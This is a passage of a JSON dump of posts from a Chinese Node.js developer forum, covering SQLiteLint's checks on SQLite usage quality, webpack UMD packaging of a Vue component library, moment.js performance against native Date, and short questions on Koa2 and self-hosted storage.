就会帮助你 review 这条语句是否写得有问题。而这在开发、测试或者灰度阶段就可以进行。</p>\n<p>检测流程十分简单：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/m0z4i6r35k.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>\\1. 收集 APP 运行时的 sql 执行信息     包括执行语句、创建的表信息等。其中表相关信息可以通过 pragma 命令得到。对于执行语句，有两种情况：     a）DB 框架提供了回调接口。比如微信使用的是 WCDB ，很容易就可以通过MMDataBase.setSQLiteTrace 注册回调拿到这些信息。     b） 若使用 Android 默认的 DB 框架，SQLiteLint 提供了一种无侵入的获取到执行的sql语句及耗时等信息的方式。通过hook的技巧，向 SQLite3 C 层的   api sqlite3_profile 方法注册回调，也能拿到分析所需的信息，从而无需开发者额外的打点统计代码。</p>\n<p>\\2. 预处理 包括生成对应的 sql 语法树，生成不带实参的 sql ，判断是否 select* 语句等，为后面的分析做准备。预处理和后面的算法调度都在一个单独的处理线程。</p>\n<p>\\3. 调度具体检测算法执行 checker 就是各种检测算法，也支持扩展。并且检测算法都是以 C++ 实现，方便支持多平台。而调度的时机包括：最近未分析 sql 语句调度，抽样调度，初始化调度，每条 sql 语句调度。</p>\n<p>\\4. 发布问题 上报问题或者弹框提示。</p>\n<p>可以看到重点在第 3 步，下面具体讨论下 SQLiteLint 目前所关注的质量问题检测。</p>\n<h2><strong>检测问题简介</strong></h2>\n<h3><strong>一、检测索引使用问题</strong></h3>\n<p>索引的使用问题是数据库最常见的问题，也是最直接影响性能的问题。SQLiteLint 的分析主要基于 SQLite3 的 “explain query plan” ，即 sql 的查询计划。先简单说下查询计划的最常见的几个关键字：</p>\n<hr>\n<p>SCAN TABLE: 全表扫描，遍历数据表查找结果集，复杂度 O(n) SEARCH TABLE: 利用索引查找，一般除了 without rowid 表或覆盖索引等，会对索引树先一次 Binary Search 找到 rowid ，然后根据得到 rowid 去数据表做一次 Binary Search 得到目标结果集，复杂度为 O(logn) USE TEMP B-TREE: 对结果集临时建树排序，额外需要空间和时间。比如有 Order By 关键字，就有可能出现这样查询计划</p>\n<hr>\n<p>通过分析查询计划，SQLiteLint 目前主要检查以下几个索引问题：</p>\n<p><strong>1. 未建索引导致的全表扫描</strong>（对应查询计划的 SCAN TABLE… ）</p>\n<p>虽然建立索引是最基本优化技巧，但实际开发中，很多同学因为意识不够或者需求太紧急，而疏漏了建立合适的索引，SQLiteLint 帮助提醒这种疏漏。问题虽小，解决也简单，但最普遍存在。 这里也顺带讨论下一般不适合建立索引的情况：写多读少以及表行数很小。但对于客户端而言，写多读少的表应该不常见。而表行数很小的情况，建索引是有可能导致查询更慢的（因为索引的载入需要的时间可能大过全表扫描了），但是这个差别是微乎其微的。所以这里认为一般情况下，客户端的查询还是尽量使用索引优化，如果确定预估表数量很小或者写多读少，也可以将这个表加到不检测的白名单。</p>\n<p>解决这类问题，当然是建立对应的索引。</p>\n<p><strong>2. 索引未生效导致的全表扫描</strong>（对应查询计划的 SCAN TABLE… ）</p>\n<p>有些情况即便建立了索引，但依然可能不生效，而这种情况有时候是可以通过优化 sql 语句去用上索引的。举个例子：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/cyklcwk29j.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>以上看到，即便已建立了索引，但实际没有使用索引来查询。 如对于这个 case ，可以把 like 变成不等式的比较：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/benly49kyj.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>这里看到已经是使用索引来 SEARCH TABLE ，避免了全表扫描。但值得注意的是并不是所有 like 的情况都可以这样优化，如 like ‘%lo’ 或 like ‘%lo%’ ，不等式就做不到了。</p>\n<p>再看个位操作导致索引不生效的例子：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/btylzrqaj2.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>位操作是最常见的导致索引不生效的语句之一。但有些时候也是有些技巧的利用上索引的，假如这个 case 里 flag 的业务取值只有 0x1，0x2，0x4，0x8 ，那么这条语句就可以通过穷举值的方式等效：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/bvh2w3oj42.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>以上看到，把位操作转成 in 穷举就能利用索引了。</p>\n<p>解决这类索引未生效导致的全表扫描 的问题，需要结合实际业务好好优化sql语句，甚至使用一些比较trick的技巧。也有可能没办法优化，这时需要添加到白名单。</p>\n<p><strong>3. 不必要的临时建树排序</strong>（对应查询计划的 USE TEMP B-TREE… )。</p>\n<p>比如sql语句中 order by 、distinct 、group by 等就有可能引起对结果集临时额外建树排序，当然很多情况都是可以通过建立恰当的索引去优化的。举个例子：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/psawt6qfsc.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>以上看到，即便id和mark都分别建立了索引，即便只需要一行结果，依然会引起重新建树排序（ USE TEMP B-TREE FOR ORDER BY ）。当然这个case非常简单，不过如果对 SQLite 的索引不熟悉或者开发时松懈了，确实很容易发生这样的问题。同样这个问题也很容易优化:</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/bec7lljm44.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>这样就避免了重新建树排序，这对于数据量大的表查询，优化效果是立竿见影的好。</p>\n<p>解决这类问题，一般就是建立合适的索引。</p>\n<p><strong>4. 不足够的索引组合</strong></p>\n<p>这个主要指已经建立了索引，但索引组合的列并没有覆盖足够 where 子句的条件式中的列。SQLiteLint 检测出这种问题，建议先关注该 sql 语句是否有性能问题，再决定是否建立一个更长的索引。举个例子：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/thy69xh2ig.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>以上看到，确实是利用了索引 genderIndex 来查询，但看到where子句里还有一个 mark=60 的条件，所以还有一次遍历判断操作才能得到最终需要的结果集。尤其对于这个 case，gender 也就是性别，那么最多 3 种情况，这个时候单独的 gender 索引的优化效果的已经不明显了。而同样，优化也是很容易的：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/pgx0htweji.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>解决这类问题，一般就是建立一个更大的组合索引。</p>\n<p><strong>5. 怎么降低误报</strong></p>\n<p>现在看到 SQLiteLint 主要根据查询计划的某些关键字去发现这些问题，但SQLite支持的查询语法是非常复杂的，而对应的查询计划也是无穷变化的。所以对查询计划自动且正确的分析，不是一件容易的事。SQLiteLint 很大的功夫也在这件事情上</p>\n<p>所以对查询计划自动且正确的分析，不是一件容易的事。SQLiteLint 很大的功夫也在这件事情上。SQLiteLint 这里主要对输出的查询计划重新构建了一棵有一定的特点的分析树，并结合sql语句的语法树，依据一定的算法及规则进行分析检测。建分析树的过程会使用到每条查询计划前面如 “0|1|0” 的数字，这里不具体展开了。 举个例子：是不是所有带有 “SCAN TABLE” 前缀的查询计划，都认为是需要优化的呢？明显不是。具体看个 case ：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/s0sqt0otex.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>这是一个联表查询，在 SQLite 的实现里一般就是嵌套循环。在这个语句中里， <a href=\"http://t3.id\">t3.id</a> 列建了索引，并且在第二层循环中用上了，但第一层循环的 SCAN TABLE是无法优化的。比如尝试给t4的id列也建立索引：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/366h9v7m9t.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>可以看出,依然无法避免 SCAN TABLE 。对于这种 SCAN TABLE 无法优化的情况，SQLiteLint 不应该误报。前面提到，会对查询计划组织成树的结构。比如对于这个 case ，最后构建的查询计划分析树为：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/85uay5umt5.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>分析树，有个主要的特点：叶子节点有兄弟节点的是联表查询，其循环顺序对应从左往右，而无兄弟节点是单表查询。而最后的分析会落地到叶子节点的分析。遍历叶子节点时，有一条规则（不完整描述）是：</p>\n<p><em>叶子节点有兄弟节点的，且是最左节点即第一层循环，且 where 子句中不含有相关常量条件表达式时，SCAN TABLE 不认为是质量问题。</em></p>\n<p>这里有两个条件必须同时满足，SCAN TABLE 才不报问题：第一层循环 &amp; 无相关常量表达式。第一层循环前面已经描述，这里再解释下后面一个条件。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/1suqr30slh.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>由上看到,当select子句中出现常量条件表达式 “t4.id=666” , 若 <a href=\"http://t3.id\">t3.id</a>,<a href=\"http://t4.id\">t4.id</a> 都建了索引，是可以优化成没有 SCAN TABLE 。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/n9abtsq4zu.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>而把 <a href=\"http://t4.id\">t4.id</a> 的索引删除后，又出现了 SCAN TABLE 。而这种 SCAN TABLE 的情况，不满足规则里的的第二个条件，SQLiteLint 就会报出可以使用索引优化了。</p>\n<p>这里介绍了一个较简单语句的查询计划的分析，当然还有更复杂的语句，还有子查询、组合等等，这里不展开讨论了。巨大的复杂性，无疑对准确率有很大的挑战，需要对分析规则不断地迭代完善。当前 SQLiteLint 的分析算法依然不足够严谨，还有很大的优化空间。 这里还有另一个思路去应对准确性的问题：对所有上报的问题，结合耗时、是否主线程、问题等级等信息，进行优先级排序。这个“曲线救国”来降低误报的策略也适用本文介绍的所有检测问题。</p>\n<h3><strong>二、检测冗余索引问题</strong></h3>\n<p>SQLiteLint 会在应用启动后对所有的表检测一次是否存在冗余索引，并建议保留最大那个索引组合。</p>\n<p>先定义什么是冗余索引：如对于某个表，如果索引组合 index1，index2 是另一个索引组合 index3 的前缀，那么一般情况下 index3 可以替代掉 index1 和 index2 的作用，所以 index1，index2 就冗余了。而多余的索引就会有多余的插入消耗和空间消耗，一般就建议只保留索引 index3 。 看个例子：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/t0dkf7mivb.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>以上看到，如果已经有一个 length 和 type 的组合索引，就已经满足了单 length 列条件式的查询，没必要再为 length 再建一个索引。</p>\n<h3><strong>三、检测 select * 问题</strong></h3>\n<p>SQLiteLint这里通过扫描 sql 语法树，若发现 select * 子句，就会报问题，建议尽量避免使用 select * ，而是按需 select 对应的列。</p>\n<p>select * 是SQLite最常用的语句之一，也非常方便，为什么还认为是问题的呢？这里有必要辩驳一下：</p>\n<ol>\n<li>对于 select * ，SQLite 底层依然存在一步把 * 展开成表的全部列。</li>\n<li>select * 也减少了可以使用覆盖索引的机会。覆盖索引指索引包含的列已经覆盖了 select 所需要的列，而使用上覆盖索引就可以减少一次数据表的查询。</li>\n<li>对于 Android 平台而言，select * 就会投射所有的列，那么每行结果占据的内存就会相对更大，那么 CursorWindow（缓冲区）的容纳条数就变少，那么 SQLiteQuery.fillWindow 的次数就可能变多，这也有一定的性能影响。</li>\n</ol>\n<p>基于以上原因，出于 SQLiteLint 目标最佳实践的原则，这里依然报问题。</p>\n<h3><strong>四、检测 Autoincrement 问题</strong></h3>\n<p>SQLiteLint 在应用启动后会检测一次所有表的创建语句，发现 AUTOINCREMENT 关键字，就会报问题，建议避免使用 Autoincrement 。</p>\n<p>这里看下为什么要检测这个问题，下面引用 SQLite 的官方文档：</p>\n<blockquote>\n<p>The AUTOINCREMENT keyword imposes extra CPU, memory, disk space, and disk I/O overhead and should be avoided if not strictly needed. It is usually not needed.</p>\n</blockquote>\n<p>可以看出 Auto Increment 确实不是个好东西。 ps. 我这里补充说明一下 strictly needed 是什么是意思，也就是为什么它不必要。通常 AUTOINCREMENT 用于修饰 INTEGER PRIMARY KEY 列，后简称IPK 列。而 IPK 列等同于 rowid 别名，本身也具有自增属性，但会复用删除的 rowid 号。比如当前有 4 行，最大的rowid是 4，这时把第 4 行删掉，再插入一行，新插入行的 rowid 取值是比当前最大的 rowid 加 1，也就 3+1=4 ，所以复用了 rowid 号 4 。而如果加以 AUTOINCREMENT 修饰就是阻止了复用，在这个情况，rowid 号是 5 。也就是说，AUTOINCREMENT 可以保证了历史自增的唯一性，但对于客户端应用有多少这样的场景呢？</p>\n<h3><strong>五、检测建议使用 prepared statement</strong></h3>\n<p>SQLiteLint 会以抽样的时机去检测这个问题，比如每 50 条执行语句，分析一次执行序列，如果发现连续执行次数超过一定阈值的相同的（当然实参可以不同）而未使用 prepared statement 的 sql 语句，就报问题，建议使用 prepared statement 优化。 如阈值是 3 ，那么连续执行下面的语句，就会报问题：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/yxyqjkahfl.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>使用 prepared statement 优化的好处有两个：</p>\n<ol>\n<li>对于相同（实参不同）的 sql 语句多次执行，会有性能提升</li>\n<li>如果参数是不可信或不可控输入，还防止了注入问题</li>\n</ol>\n<h3><strong>六、检测建议使用 without rowid 特性</strong></h3>\n<p>SQLiteLint 会在应用启动后检测一次所有表的创建语句，发现未使用 without rowid 技巧且根据表信息判断适合使用 without rowid 优化的表，就报问题，建议使用 without rowid 优化。 这是 SQLiteLint 的另一个思路，就是发现是否可以应用上一些 SQLite 的高级特性。</p>\n<p>without rowid 在某些情况下可以同时带来空间以及时间上将近一半的优化。简单说下原理，如：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/8d1v0ex32e.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>对于这个含有 rowid 的表（ rowid 是自动生成的），这时这里涉及到两次查询，一次在 name 的索引树上找到对应的 rowid ，一次是用这个 rowid 在数据树上查询到 mark 列。 而使用 without rowid 来建表：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/598196/q3w24rhvpl.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>数据树构建是以 name 为 key ，mark 为 data 的，并且是以普通 B-tree 的方式存储。这样对于刚刚同样的查询，就需要只有一次数据树的查询就得到了 mark 列，所以算法复杂度上已经省了一个 O(logn）。另外又少维护了一个 name 的索引树，插入消耗和空间上也有了节省。</p>\n<p>当然 withou rowid 不是处处适用的，不然肯定是默认属性了。SQLiteLint 判断如果同时满足以下两个条件，就建议使用 without rowid ：</p>\n<ol>\n<li>表含有 non-integer or composite (multi-column) PRIMARY KEY</li>\n<li>表每行数据大小不大，一个比较好的标准是行数据大小小于二十分之一的page size 。ps.默认 page size SQLite 版本3.12.0以后（对应 Android O 以上）是 4096 bytes ，以前是 1024 。而由于行数据大小业务相关，为了降低误报，SQLiteLint 使用更严格的判定标准：表不含有 BLOB 列且不含有非 PRIMARY KEY TEXT 列。</li>\n</ol>\n<p>简单说下原因： 对于1，假如没有 PRIMARY KEY ，无法使用 without rowid 特性；假如有 INTEGER PRIMARY KEY ，前面也说过，这时也已经等同于 rowid 。 对于 2，小于 20 分之一 pagesize 是官方给出的建议。 这里说下我理解的原因。page 是 SQLite 一般的读写单位（实际上磁盘的读写 block 更关键，而磁盘的消耗更多在定位上，更多的page就有可能需要更多的定位）。without rowid 的表是以普通 B-Tree 存储的，而这时数据也存储在所有树结点上，那么假如数据比较大，一个 page 存储的结点变少，那么查找的过程就需要读更多的 page ，从而查找的消耗更大。当然这是相对 rowid 表 B*-Tree 的存储来说的，因为这时数据都在叶子结点，搜索路径上的结点只有 KEY ，那么一个page能存的结点就多了很多，查找磁盘消耗变小。这里注意的是，不要以纯内存的算法复杂度去考量这个问题。以上是推论不一定正确，欢迎指教。</p>\n<p>引申一下，这也就是为什么 SQLite 的索引树以 B-Tree 组织，而 rowid 表树以 B*-Tree 组织，因为索引树每个结点的存主要是索引列和 rowid ，往往没这么大，相对 B*-Tree 优势就在于不用一直查找到叶子结点就能结束查找。与 without rowid 同样的限制，不建议用大 String 作为索引列，这当然也可以加入到 SQLiteLint 的检测。</p>\n<h2><strong>小结</strong></h2>\n<p>这里介绍了一个在开发、测试或者灰度阶段进行 SQLite 使用质量检测的工具，这个思路的好处是：</p>\n<ul>\n<li>上线前发现问题</li>\n<li>关注最佳实践</li>\n</ul>\n<p>本文的较大篇幅其实是对 SQLite 最佳实践的讨论，因为 SQLiteLint 的思路就是对最佳实践的自动化检测。当然检查可以覆盖更广的范围，准确性也是挑战，这里还有很大的空间。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n</div>","title":"如何做好SQLite 使用质量检测，让事故消灭在摇篮里","last_reply_at":"2018-12-18T09:58:49.698Z","good":false,"top":false,"reply_count":0,"visit_count":416,"create_at":"2018-12-18T09:58:49.698Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"58bf466416500ba80ee9a4d0","author_id":"58b9fc77e418a986315f3b73","tab":"ask","content":"<div class=\"markdown-text\"><p>如题,官方并没有ctx.response.locals用来设置全局变量。</p>\n</div>","title":"Koa2怎么才能设置全局变量","last_reply_at":"2018-12-18T08:53:14.591Z","good":false,"top":false,"reply_count":11,"visit_count":5227,"create_at":"2017-03-07T23:46:44.903Z","author":{"loginname":"995270418L","avatar_url":"https://avatars2.githubusercontent.com/u/17432557?v=4&s=120"}},{"id":"5c185c23f3d48d2397c124b9","author_id":"58d866b86f8b9bf02d1d0b20","tab":"ask","content":"<div class=\"markdown-text\"><p>有没有更好的，推荐下，最好是node写的。容易改，nextcloud速度太慢，不清楚为啥，还没有scp的速度快。。seafile速度快，但会切割文件，，</p>\n<p>来自酷炫的 <a href=\"https://github.com/TakWolf/CNode-Material-Design\">CNodeMD</a></p>\n</div>","title":"大家有没有用过类似nextcloud,seafile网盘软件","last_reply_at":"2018-12-18T02:32:03.920Z","good":false,"top":false,"reply_count":0,"visit_count":647,"create_at":"2018-12-18T02:32:03.920Z","author":{"loginname":"wjiban","avatar_url":"https://avatars3.githubusercontent.com/u/23730727?v=4&s=120"}},{"id":"5833e104bde2b59e06141e16","author_id":"571c3c2d5a26c4a841ecbc64","tab":"share","content":"<div class=\"markdown-text\"><p>为了方便其他开发者使用组件库，开发的 Vue 组件库在发布之前需要对其打包。本文基于 Webpack 讨论打包 Vue 组件库的正确方法。</p>\n<h2>选择正确的打包格式</h2>\n<p>首先，我们必须明确组件库的使用场景。有些场景是直接使用 <code>&lt;script&gt;</code> 在 HTML 中引入，有些场景是使用打包工具在后台构建。作为组件库，应该兼容这些使用场景。组件库应该保持中立，不应该限定于某种使用方式或者打包工具。例如，虽然 Webpack 很流行，组件库不能声明只支持 Webpack 方式使用，忽略了其他选择。原因在于，打包工具并不只有 webpack，还有 browserify、rollup 等。另外，前端工具发展很快，今年流行的工具明年可能就没人用了，你肯定不希望你的组件库会随着某个工具不流行而消逝吧。回顾下曾经流行的 grunt、glup，一大堆基于它们的插件随着工具本身的不流行而被扔进了垃圾箱。</p>\n<p>为了支持多种使用场景，我们需要选择合适的打包格式。常见的打包格式有 CMD、AMD、UMD，CMD只能在 Node 环境执行，AMD 只能在浏览器端执行，UMD 同时支持两种执行环境。显而易见，我们应该选择 UMD 格式。Webpack 中指定输出格式的设置项为 <code>output.libraryTarget</code>，其支持的格式有：</p>\n<ul>\n<li>“var” - 以一个变量形式输出： var Library = xxx (default)；</li>\n<li>“this” - 以 this 的一个属性输出： this[“Library”] = xxx；</li>\n<li>“commonjs” - 以 exports 的一个属性输出：exports[“Library”] = xxx；</li>\n<li>“commonjs2” - 以 module.exports 形式输出：module.exports = xxx；</li>\n<li>“amd” - 以 AMD 格式输出；</li>\n<li>“umd” - 同时以 AMD、CommonJS2 和全局属性形式输出。</li>\n</ul>\n<p>以下是 <code>webpack.config.js</code> 中 <code>output</code> 设置的示例：</p>\n<pre class=\"prettyprint language-javascript\"><code>output: {\n    path: path.resolve(__dirname, &#x27;..&#x2F;dist&#x27;),\n    publicPath: &#x27;&#x2F;dist&#x2F;&#x27;,\n    filename: &#x27;iview.js&#x27;,\n    library: &#x27;iview&#x27;,       &#x2F;&#x2F; 模块名称\n    libraryTarget: &#x27;umd&#x27;,   &#x2F;&#x2F; 输出格式\n    umdNamedDefine: true    &#x2F;&#x2F; 是否将模块名称作为 AMD 输出的命名空间\n}\n</code></pre><p>到此，我们解决了组件库输出的问题。</p>\n<h2>如何打包组件依赖</h2>\n<p>在<a href=\"http://jingsam.github.io/2016/11/01/peerDependencies-in-Vue-components.html\">前一篇</a>文章中我们讨论了组件库实质上是 Vue 的插件，Vue 应该是组件库的外部依赖。组件库的使用者会自行导入 Vue，打包的时候，不应该将 Vue 打包进组件库。</p>\n<p>在 webpack 中，我们可以将 Vue 设置为 <code>externals</code>，以避免将 Vue 打包进组件库，相应的设置如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>externals: {\n    vue: &#x27;vue&#x27;\n}\n</code></pre><p>啊哈，我们搞定了组件依赖问题。至此，读者可能很皱起眉头开始埋怨我了：这么简单的问题，查下 webpack 文档不就得了，还用得着我啰里啰嗦地写这么多！</p>\n<p>事实上，问题往往没有我们想得那么简单！如果你将打包后的组件库以 <code>&lt;script&gt;</code> 标签形式直接引入，你会发现并不能正常执行，提示 vue 未定义。</p>\n<p>为了分析问题，我们将打包的代码前几行拿出来看看：</p>\n<pre class=\"prettyprint language-javascript\"><code>(function webpackUniversalModuleDefinition(root, factory) {\n    if(typeof exports === &#x27;object&#x27; &amp;&amp; typeof module === &#x27;object&#x27;)\n        module.exports = factory(require(&quot;vue&quot;));\n    else if(typeof define === &#x27;function&#x27; &amp;&amp; define.amd)\n        define(&quot;iview&quot;, [&quot;vue&quot;], factory);\n    else if(typeof exports === &#x27;object&#x27;)\n        exports[&quot;iview&quot;] = factory(require(&quot;vue&quot;));\n    else\n        root[&quot;iview&quot;] = factory(root[&quot;vue&quot;]);\n})(this, function(__WEBPACK_EXTERNAL_MODULE_157__) {\n    &#x2F;&#x2F; ....\n})\n</code></pre><p>我们可以看见，打包后的代码以 4 种形式声明了 Vue 依赖：</p>\n<ol>\n<li><code>module.exports = factory(require(&quot;vue&quot;))</code> - commonjs2 形式；</li>\n<li><code>define(&quot;iview&quot;, [&quot;vue&quot;], factory)</code> - AMD 形式；</li>\n<li><code>exports[&quot;iview&quot;] = factory(require(&quot;vue&quot;))</code> - commonjs 形式；</li>\n<li><code>root[&quot;iview&quot;] = factory(root[&quot;vue&quot;])</code> - 全局变量形式。</li>\n</ol>\n<p>以 <code>&lt;script&gt;</code> 标签形式使用组件时，会同样使用 <code>&lt;script&gt;</code> 标签导入 Vue。Vue 导入的变量是 “window.Vue” 而不是 “window.vue”，因此会出现 vue 未定义的错误。</p>\n<p>幸好，webpack 可以为各种导入形式设置不同名称，设置如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>externals: {\n    vue: {\n        root: &#x27;Vue&#x27;,\n        commonjs: &#x27;vue&#x27;,\n        commonjs2: &#x27;vue&#x27;,\n        amd: &#x27;vue&#x27;\n    }\n}\n</code></pre><p>再次打包，你可以发现打包的组件库不管是 <code>&lt;script&gt;</code> 标签方式还是后端构建，都可以正常工作了。</p>\n<p>最后，帖一个打包 iView 组件库的 webpack 配置：</p>\n<pre class=\"prettyprint language-javascript\"><code>var path = require(&#x27;path&#x27;);\nvar webpack = require(&#x27;webpack&#x27;);\n\nmodule.exports = {\n    entry: {\n        main: &#x27;.&#x2F;src&#x2F;index.js&#x27;\n    },\n    output: {\n        path: path.resolve(__dirname, &#x27;..&#x2F;dist&#x27;),\n        publicPath: &#x27;&#x2F;dist&#x2F;&#x27;,\n        filename: &#x27;iview.js&#x27;,\n        library: &#x27;iview&#x27;,\n        libraryTarget: &#x27;umd&#x27;,\n        umdNamedDefine: true\n    },\n    externals: {\n        vue: {\n            root: &#x27;Vue&#x27;,\n            commonjs: &#x27;vue&#x27;,\n            commonjs2: &#x27;vue&#x27;,\n            amd: &#x27;vue&#x27;\n        }\n    },\n    resolve: {\n        extensions: [&#x27;&#x27;, &#x27;.js&#x27;, &#x27;.vue&#x27;]\n    },\n    module: {\n        loaders: [{\n            test: &#x2F;\\.vue$&#x2F;,\n            loader: &#x27;vue&#x27;\n        }, {\n            test: &#x2F;\\.js$&#x2F;,\n            loader: &#x27;babel&#x27;,\n            exclude: &#x2F;node_modules&#x2F;\n        }, {\n            test: &#x2F;\\.css$&#x2F;,\n            loader: &#x27;style!css!autoprefixer&#x27;\n        }, {\n            test: &#x2F;\\.less$&#x2F;,\n            loader: &#x27;style!css!less&#x27;\n        }, {\n            test: &#x2F;\\.(gif|jpg|png|woff|svg|eot|ttf)\\??.*$&#x2F;,\n            loader: &#x27;url?limit=8192&#x27;\n        }, {\n            test: &#x2F;\\.(html|tpl)$&#x2F;,\n            loader: &#x27;vue-html&#x27;\n        }]\n    },\n    plugins: [\n        new webpack.DefinePlugin({\n            &#x27;process.env&#x27;: {\n                NODE_ENV: &#x27;&quot;development&quot;&#x27;\n            }\n        })\n    ]\n}\n</code></pre></div>","title":"打包 Vue 组件库的正确姿势","last_reply_at":"2018-12-18T01:56:23.200Z","good":true,"top":false,"reply_count":6,"visit_count":17241,"create_at":"2016-11-22T06:09:08.922Z","author":{"loginname":"jingsam","avatar_url":"https://avatars3.githubusercontent.com/u/1522494?v=4&s=120"}},{"id":"5c17a1d17ec239239ff57ba6","author_id":"58898ca65d4612c33919ea01","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p><a href=\"https://github.com/moment/moment/\">momentjs</a>是一个很流行的处理日期、时间的库，这个库提供了很多友好的方法，方便开发者对日期时间进行比较、格式化等操作。然而，由于这个库是基于面向对象的思维逻辑设计的，每一个moment对象会自带很多属性和方法，在进行相关的操作时会进行很多校验、转换等操作，所以在对性能比较敏感的程序中可能会存在一定的问题，特别是在循环语句中，性能问题可能更加突出。</p>\n<p>我在实际的项目中就遇到过在循环语句中使用<code>momentjs</code>导致性能问题的情景：从一个数组中取出符合条件的元素，条件之一是需要对元素的某个日期时间属性作判断，使用到了<code>momentjs</code>的<code>.isAfter</code>方法，数组中有4百多个元素，每次遍历一个元素需要80ms，所以完成整个遍历需要30多秒，虽然使用场景不是提供API接口，但这也是很难接受的。后来换成了<code>JavaScript</code>原生的方法，每遍历一个元素只需要不到2ms，遍历所有的元素不到一秒就完成了，性能瞬间就提升了。说明：我仅仅是修改了日期时间比较的代码，其他没有做任何优化。</p>\n<h2>简单测试</h2>\n<p>我们可以简单的测试一下<code>momentjs</code>和原生的<code>JavaScript</code>方法之间的性能差异，测试代码如下：</p>\n<pre class=\"prettyprint language-js\"><code>const debug = require(&#x27;debug&#x27;)(&#x27;moment-demo&#x27;);\nconst moment = require(&#x27;moment&#x27;);\n\nconst items = [];\nfor (let i = 0; i &lt; 500; i += 1) {\n  const ts = new Date().getTime();\n  const n1 = Math.floor(Math.random() * 1000);\n  const n2 = Math.floor(Math.random() * 1000);\n\n  items.push({\n    n1,\n    n2,\n    time1: new Date(ts - n1 * 24 * 60 * 60 * 60),\n    time2: new Date(ts - n2 * 24 * 60 * 60 * 60)\n  });\n}\n\ndebug(&#96;items len: ${items.length}&#96;);\n\nconst arr1 = [];\nfor (let i = 0, iLen = items.length; i &lt; iLen; i += 1) {\n  const item = items[i];\n  if (moment(item.time2).isAfter(item.time1)) {\n    arr1.push(item);\n  }\n}\n\ndebug(&#96;arr1 len: ${arr1.length}&#96;);\n\nconst arr2 = [];\nfor (let i = 0, iLen = items.length; i &lt; iLen; i += 1) {\n  const item = items[i];\n  const t1 = new Date(item.time1).getTime();\n  const t2 = new Date(item.time2).getTime();\n  if (t2 &gt; t1) {\n    arr2.push(item);\n  }\n}\n\ndebug(&#96;arr2 len: ${arr2.length}&#96;);\n\n</code></pre><p>测试结果如下：</p>\n<p><img src=\"//static.cnodejs.org/FnTIIjGeqUgTCXUqyqVCg2cK0SdZ\" alt=\"debug.jpg\"></p>\n<blockquote>\n<p>从结果可以看出，<code>momentjs</code>在性能上确实逊色于原生的<code>JavaScript</code>方法。</p>\n</blockquote>\n<h2>相关库的比较</h2>\n<p>其实，github上已经有一个项目专门分析<code>momentjs</code>与其他日期时间处理库的各项对比，项目地址在<a href=\"https://github.com/you-dont-need/You-Dont-Need-Momentjs\">这里</a>。一个简要对比如图：</p>\n<p><img src=\"//static.cnodejs.org/Ft4NwisECTDEouN71FfR6zvX5ce1\" alt=\"vs.jpg\"></p>\n<h2>我的建议</h2>\n<p>如果你只是用<code>momentjs</code>中的两三个方法，则完全可以考虑使用其他更加轻量、性能更加好的库，或者使用<code>JavaScript</code>原生的方法，必要时封装一下即可。如果程序对性能有较高的要求，最好不要使用<code>momentjs</code>。</p>\n</div>","title":"或许你真的不需要moment.js","last_reply_at":"2018-12-18T01:48:12.578Z","good":false,"top":false,"reply_count":3,"visit_count":914,"create_at":"2018-12-17T13:17:05.988Z","author":{"loginname":"blackmatch","avatar_url":"https://avatars3.githubusercontent.com/u/12443954?v=4&s=120"}},{"id":"5c171512f3d48d2397c11df9","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017339754\">提高 JavaScript 开发效率的高级 VSCode 扩展！</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<h3>Quokka.js</h3>\n<p><a href=\"https://quokkajs.com/docs/\">Quokka.js</a> 是一个用于 JavaScript 和 TypeScript 的实时运行代码平台。这意味着它会实时运行你输入后的代码，并在编辑器中显示各种执行结果，建议亲自尝试一下。</p>\n<p><img 